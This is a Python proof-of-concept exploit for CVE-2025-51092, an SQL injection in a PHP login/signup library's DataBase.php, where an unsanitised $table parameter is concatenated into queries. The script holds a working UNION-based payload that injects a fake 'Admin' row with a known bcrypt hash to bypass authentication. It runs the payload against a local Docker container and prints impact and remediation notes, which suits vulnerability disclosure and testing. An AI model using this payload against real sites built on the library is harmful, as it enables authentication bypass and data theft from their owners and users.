#!/usr/bin/env python3
"""
CVE-2025-51092 SQL Injection PoC
Vulnerability in LogIn-SignUp by VishnuSivadasVS

The logIn() and signUp() functions in DataBase.php do not use prepared statements
and the $table parameter is not sanitized, allowing SQL injection when developers
pass user input to the table parameter.
"""

import requests
import sys
import subprocess


def run_php_injection_test(target_host="db"):
    """Test SQL injection directly via PHP in the container"""
    php_code = '''
require "/var/www/html/DataBase.php";
$db = new DataBase();
$db->dbConnect();

$malicious_table = "users WHERE 1=2 UNION SELECT 1,'Admin','injected','\\$2y\\$10\\$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi','email' -- ";
$result = $db->logIn($malicious_table, "injected", "password");
echo $result ? "VULNERABLE" : "NOT_VULNERABLE";
'''
    
    try:
        result = subprocess.run(
            ["docker", "exec", "cve-2025-51092-web", "php", "-r", php_code],
            capture_output=True,
            text=True,
            timeout=30
        )
        return "VULNERABLE" in result.stdout
    except Exception as e:
        print(f"[-] Error running PHP test: {e}")
        return False


def test_table_injection_scenario(target_url):
    """
    Demonstrate the vulnerability when table parameter comes from user input.
    This requires a wrapper script that passes user input to the table parameter.
    """
    print("[*] Testing table parameter SQL injection scenario...")
    print("[*] This vulnerability occurs when developers use the library like:")
    print("    $db->logIn($_POST['table'], $_POST['username'], $_POST['password']);")
    print()
    
    bcrypt_hash = "$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi"
    
    payload = f"users WHERE 1=2 UNION SELECT 1,'Admin','injected','{bcrypt_hash}','email' -- "
    
    print(f"[*] Malicious table parameter:")
    print(f"    {payload}")
    print()
    print(f"[*] This transforms the SQL query from:")
    print(f"    SELECT * FROM users WHERE username = 'injected'")
    print(f"[*] To:")
    print(f"    SELECT * FROM users WHERE 1=2 UNION SELECT 1,'Admin','injected','<bcrypt_hash>','email' --  WHERE username = 'injected'")
    print()
    
    return True


def main():
    target = "http://127.0.0.1:8089"
    
    print("=" * 70)
    print("CVE-2025-51092 - SQL Injection in LogIn-SignUp PHP Library")
    print("=" * 70)
    print()
    print("[*] Vulnerability: The $table parameter in logIn() and signUp()")
    print("    functions is directly concatenated into SQL queries without")
    print("    validation or prepared statements.")
    print()
    print("[*] Affected file: DataBase.php")
    print("[*] Affected functions: logIn(), signUp()")
    print()
    
    test_table_injection_scenario(target)
    
    print("[*] Running SQL injection test in container...")
    if run_php_injection_test():
        print("[+] VULNERABILITY CONFIRMED!")
        print("[+] SQL injection via table parameter bypasses authentication")
        print()
        print("[*] Impact:")
        print("    - Authentication bypass")
        print("    - Data extraction via UNION injection")
        print("    - Potential database compromise")
        print()
        print("[*] Remediation:")
        print("    - Use prepared statements (mysqli_prepare)")
        print("    - Whitelist allowed table names")
        print("    - Never concatenate user input into SQL queries")
        return 0
    else:
        print("[-] Vulnerability test failed")
        return 1


if __name__ == "__main__":
    sys.exit(main())
